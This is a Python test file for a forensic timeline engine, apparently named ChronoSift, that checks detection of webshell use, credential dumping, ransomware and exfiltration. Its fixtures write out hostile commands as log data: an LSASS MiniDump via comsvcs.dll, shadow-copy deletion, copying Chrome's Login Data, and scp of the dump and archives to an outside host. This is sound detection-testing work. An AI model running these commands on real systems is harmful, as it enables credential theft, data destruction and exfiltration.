"""
Composite and contextual tests for ChronoSift v2.31.
"""
import importlib.util
import pathlib
import sys
import unittest

import pandas as pd


MODULE_PATH = pathlib.Path(__file__).resolve().parents[1] / "chronoSIFT_v2_31.py"
SPEC = importlib.util.spec_from_file_location("chronosift_v2_31_context", MODULE_PATH)
MODULE = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = MODULE
SPEC.loader.exec_module(MODULE)
ChronoSiftEngine = MODULE.ChronoSiftEngine

RULES_PATH = "rules/rules_profiled_audited_nsrl_updates_baseline_yara_fixed_v10.yaml"
WEIGHTS_PATH = "rules/weights_profiled_audited_nsrl_updates_baseline_yara_fixed_v8.yaml"


def _build_timeline():
    base_ts = pd.Timestamp("2024-06-16T12:00:00Z")
    rows = [
        {
            "parser": "chrome_27_history",
            "message": "Download: payload.exe",
            "filename": "payload.exe",
            "display_name": "payload.exe",
            "url": "https://evil.example/payload.exe",
            "timestamp_desc": "File Downloaded",
            "hostname": "victim1",
        },
        {
            "parser": "winprefetch",
            "message": "Prefetch [PAYLOAD.EXE] was executed",
            "filename": "payload.exe",
            "display_name": "payload.exe",
            "file_path": r"C:\Users\alice\Downloads\payload.exe",
            "timestamp_desc": "Last run time",
            "hostname": "victim1",
        },
        {
            "parser": "filestat",
            "filename": "/var/www/html/cmd.php",
            "display_name": "cmd.php",
            "relative_path": "/var/www/html/cmd.php",
            "timestamp_desc": "Creation Time",
            "hostname": "victim1",
        },
        {
            "parser": "apache_access",
            "message": "GET /cmd.php?cmd=id HTTP/1.1",
            "url": "http://victim/cmd.php?cmd=id",
            "timestamp_desc": "Entry Written",
            "hostname": "victim1",
        },
        {
            "parser": "bash_history",
            "command_line": "php /var/www/html/cmd.php",
            "message": "php /var/www/html/cmd.php",
            "timestamp_desc": "Content Modification Time",
            "hostname": "victim1",
        },
        {
            "parser": "bash_history",
            "command_line": "vssadmin delete shadows /all /quiet",
            "message": "vssadmin delete shadows /all /quiet",
            "timestamp_desc": "Content Modification Time",
            "hostname": "victim1",
        },
        {
            "parser": "bash_history",
            "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 123 C:\\Users\\Public\\lsass.dmp full",
            "message": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 123 C:\\Users\\Public\\lsass.dmp full",
            "timestamp_desc": "Content Modification Time",
            "hostname": "victim1",
        },
        {
            "parser": "filestat",
            "filename": "C:/Users/alice/AppData/Local/Google/Chrome/User Data/Default/Login Data",
            "display_name": "Login Data",
            "relative_path": "C:/Users/alice/AppData/Local/Google/Chrome/User Data/Default/Login Data",
            "timestamp_desc": "Last Access Time",
            "hostname": "victim1",
        },
        {
            "parser": "bash_history",
            "command_line": r'copy "C:\Users\alice\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\Temp\login-data.db',
            "message": r'copy "C:\Users\alice\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\Temp\login-data.db',
            "timestamp_desc": "Content Modification Time",
            "hostname": "victim1",
        },
        {
            "parser": "bash_history",
            "command_line": r"scp C:\Temp\login-data.db admin@1.2.3.4:/tmp/",
            "message": r"scp C:\Temp\login-data.db admin@1.2.3.4:/tmp/",
            "timestamp_desc": "Content Modification Time",
            "hostname": "victim1",
        },
    ]
    for i in range(26):
        rows.append({
            "parser": "filestat",
            "filename": f"/home/alice/docs/doc{i}.txt",
            "display_name": f"doc{i}.txt",
            "relative_path": f"/home/alice/docs/doc{i}.txt",
            "timestamp_desc": "Content Modification Time",
            "hostname": "victim1",
        })
    rows.extend([
        {
            "parser": "bash_history",
            "command_line": "scp archive1.tar.gz admin@1.2.3.4:/tmp/",
            "message": "scp archive1.tar.gz admin@1.2.3.4:/tmp/",
            "timestamp_desc": "Content Modification Time",
            "hostname": "victim1",
        },
        {
            "parser": "bash_history",
            "command_line": "scp C:\\Users\\Public\\lsass.dmp admin@1.2.3.4:/tmp/",
            "message": "scp C:\\Users\\Public\\lsass.dmp admin@1.2.3.4:/tmp/",
            "timestamp_desc": "Content Modification Time",
            "hostname": "victim1",
        },
        {
            "parser": "bash_history",
            "command_line": "scp archive2.tar.gz admin@1.2.3.4:/tmp/",
            "message": "scp archive2.tar.gz admin@1.2.3.4:/tmp/",
            "timestamp_desc": "Content Modification Time",
            "hostname": "victim1",
        },
    ])
    ts = pd.to_datetime([base_ts + pd.Timedelta(seconds=10 * i) for i in range(len(rows))], utc=True)
    df = pd.DataFrame(rows, index=ts)
    df["chronosift_row_id"] = list(range(len(rows)))
    return df


class ChronoSiftV231ContextTest(unittest.TestCase):
    def setUp(self):
        self.engine = ChronoSiftEngine.from_yaml(RULES_PATH, WEIGHTS_PATH)

    def test_temporal_deadbox_composites_fire(self):
        out = self.engine.apply_atomic(_build_timeline())
        out = self.engine.apply_contextual(out)

        self.assertGreater(float(out.iloc[1]["chronosift_signals"].get("user_execution_after_download", 0)), 0)
        self.assertGreater(float(out.iloc[1]["chronosift_signals"].get("ingress_tool_transfer", 0)), 0)
        self.assertGreater(float(out.iloc[3]["chronosift_signals"].get("webshell_activity", 0)), 0)
        self.assertGreater(float(out.iloc[4]["chronosift_signals"].get("web_upload_execution_chain", 0)), 0)
        self.assertGreater(float(out.iloc[6]["chronosift_signals"].get("credential_dump_collection", 0)), 0)
        self.assertGreater(float(out.iloc[7]["chronosift_signals"].get("password_store_exfil_chain", 0)), 0)
        ransomware_row = next(
            row for _, row in out.iterrows()
            if float((row["chronosift_signals"] or {}).get("mass_file_modification", 0)) > 0
        )
        self.assertGreater(float(ransomware_row["chronosift_signals"].get("mass_file_modification", 0)), 0)
        self.assertGreater(float(ransomware_row["chronosift_signals"].get("ransomware_impact", 0)), 0)
        exfil_row = next(
            row for _, row in out.iterrows()
            if float((row["chronosift_signals"] or {}).get("automated_exfiltration", 0)) > 0
        )
        self.assertGreater(float(exfil_row["chronosift_signals"].get("automated_exfiltration", 0)), 0)

    def test_unrelated_transfer_does_not_imply_password_store_exfil(self):
        ts = pd.to_datetime([
            "2024-06-16T13:00:00Z",
            "2024-06-16T13:05:00Z",
        ], utc=True)
        df = pd.DataFrame([
            {
                "parser": "filestat",
                "filename": "C:/Users/alice/AppData/Local/Google/Chrome/User Data/Default/Login Data",
                "display_name": "Login Data",
                "relative_path": "C:/Users/alice/AppData/Local/Google/Chrome/User Data/Default/Login Data",
                "timestamp_desc": "Last Access Time",
                "hostname": "victim2",
            },
            {
                "parser": "bash_history",
                "command_line": "scp archive1.tar.gz admin@1.2.3.4:/tmp/",
                "message": "scp archive1.tar.gz admin@1.2.3.4:/tmp/",
                "timestamp_desc": "Content Modification Time",
                "hostname": "victim2",
            },
        ], index=ts)
        df["chronosift_row_id"] = list(range(len(df)))

        out = self.engine.apply_contextual(self.engine.apply_atomic(df.copy()))

        self.assertEqual(float((out.iloc[0]["chronosift_signals"] or {}).get("password_store_access", 0)), 1.0)
        self.assertEqual(float((out.iloc[0]["chronosift_signals"] or {}).get("password_store_exfil_chain", 0)), 0.0)

    def test_ransomware_extension_burst_drives_impact_without_mass_modification(self):
        rows = [{
            "parser": "bash_history",
            "command_line": "vssadmin delete shadows /all /quiet",
            "message": "vssadmin delete shadows /all /quiet",
            "timestamp_desc": "Content Modification Time",
            "hostname": "victim3",
        }]
        for i in range(6):
            rows.append({
                "parser": "filestat",
                "filename": f"/home/alice/docs/quarterly-{i}.locked",
                "display_name": f"quarterly-{i}.locked",
                "relative_path": f"/home/alice/docs/quarterly-{i}.locked",
                "timestamp_desc": "Content Modification Time",
                "hostname": "victim3",
            })
        ts = pd.to_datetime([pd.Timestamp("2024-06-16T14:00:00Z") + pd.Timedelta(minutes=i) for i in range(len(rows))], utc=True)
        df = pd.DataFrame(rows, index=ts)
        df["chronosift_row_id"] = list(range(len(df)))

        out = self.engine.apply_contextual(self.engine.apply_atomic(df.copy()))
        burst_row = next(
            row for _, row in out.iterrows()
            if float((row["chronosift_signals"] or {}).get("ransomware_extension_burst", 0)) > 0
        )
        self.assertGreater(float(burst_row["chronosift_signals"].get("ransomware_extension_burst", 0)), 0)
        self.assertEqual(float(burst_row["chronosift_signals"].get("mass_file_modification", 0)), 0.0)
        self.assertGreater(float(burst_row["chronosift_signals"].get("ransomware_impact", 0)), 0)

    def test_small_ransom_extension_count_stays_below_burst_threshold(self):
        rows = []
        for i in range(3):
            rows.append({
                "parser": "filestat",
                "filename": f"/home/alice/docs/partial-{i}.locked",
                "display_name": f"partial-{i}.locked",
                "relative_path": f"/home/alice/docs/partial-{i}.locked",
                "timestamp_desc": "Content Modification Time",
                "hostname": "victim4",
            })
        ts = pd.to_datetime([pd.Timestamp("2024-06-16T15:00:00Z") + pd.Timedelta(minutes=i) for i in range(len(rows))], utc=True)
        df = pd.DataFrame(rows, index=ts)
        df["chronosift_row_id"] = list(range(len(df)))

        out = self.engine.apply_contextual(self.engine.apply_atomic(df.copy()))
        for _, row in out.iterrows():
            signals = row["chronosift_signals"] or {}
            self.assertEqual(float(signals.get("ransomware_extension_burst", 0)), 0.0)
            self.assertEqual(float(signals.get("ransomware_impact", 0)), 0.0)


if __name__ == "__main__":
    unittest.main()
